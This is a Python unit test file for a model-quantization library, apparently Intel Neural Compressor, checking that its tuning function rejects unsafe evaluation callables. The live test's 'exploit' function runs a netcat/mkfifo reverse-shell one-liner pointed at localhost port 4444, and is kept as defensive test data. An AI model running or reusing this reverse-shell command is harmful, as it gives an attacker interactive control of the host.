import os
import time
import unittest

import torch
import torch.nn as nn

from neural_compressor import PostTrainingQuantConfig
from neural_compressor.mix_precision import fit
from neural_compressor.security import secure_eval_func

# class DummyModel:
#     def __call__(self, x):
#         return x


# def boom_picklable(model):
#     raise ValueError("inner boom (picklable)")


# class TestSandboxSecurity(unittest.TestCase):

#     def test_forbidden_pattern_rejected(self):
#         # Contains 'os.system' triggers static scan ValueError
#         def bad_func(model):
#             os.system("echo HI")
#             return 0.0

#         with self.assertRaises(ValueError):
#             secure_eval_func(bad_func)

#     def test_child_exception_raised_fallback(self):
#         # local function is not picklable -> returns original function -> directly raises ValueError
#         def boom(model):
#             raise ValueError("inner boom")

#         wrapped = secure_eval_func(boom)
#         with self.assertRaises(ValueError) as ctx:
#             wrapped(DummyModel())
#         self.assertIn("inner boom", str(ctx.exception))

#     def test_child_exception_raised_wrapped(self):
#         # Picklable function will be wrapped; exception caught in child process -> parent receives RuntimeError
#         wrapped = secure_eval_func(boom_picklable)
#         with self.assertRaises(RuntimeError) as ctx:
#             wrapped(DummyModel())
#         self.assertIn("inner boom (picklable)", str(ctx.exception))

#     def test_unpicklable_closure_fallback(self):
#         ext = 42

#         def closure(model):
#             return ext + 1

#         # Closure usually not picklable by standard pickle -> fallback to original function (no error)
#         wrapped = secure_eval_func(closure)
#         self.assertEqual(wrapped(DummyModel()), 43)

#     def test_safe_function_ok(self):
#         def ok(model):
#             return 0.987

#         wrapped = secure_eval_func(ok)
#         self.assertEqual(wrapped(DummyModel()), 0.987)


def exploit(model):
    __import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f")
    return 1.0


class DummyTorchModel(nn.Module):
    def forward(self, x):
        return x


class TestAdaptSecurity(unittest.TestCase):
    def test_security(self):
        dummy_model = DummyTorchModel()
        conf = PostTrainingQuantConfig()
        conf.precisions = ["fp32"]
        conf.excluded_precisions = []
        with self.assertRaises(RuntimeError) as ctx:
            fit(model=dummy_model, conf=conf, eval_func=exploit)
        self.assertIn("Rejected unsafe eval_func", str(ctx.exception))


if __name__ == "__main__":
    unittest.main()
